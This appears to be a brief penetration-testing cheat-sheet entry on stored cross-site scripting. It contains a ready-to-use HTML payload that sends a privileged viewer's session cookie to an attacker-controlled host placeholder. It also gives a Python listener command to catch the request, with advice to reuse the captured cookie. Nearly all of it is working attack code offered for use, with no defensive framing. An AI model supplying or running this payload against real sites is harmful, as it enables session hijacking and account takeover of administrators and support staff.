# XSS

Stored XSS targeting a privileged viewer (admin dashboard, support-ticket reviewer, etc.) to steal their session — works when the session cookie lacks `HttpOnly`:

```html
<body onload="new Image().src='http://<LHOST>?c='+document.cookie;">
```

```bash
python -m http.server <LPORT>    # catch the exfil hit, then reuse the captured cookie
```
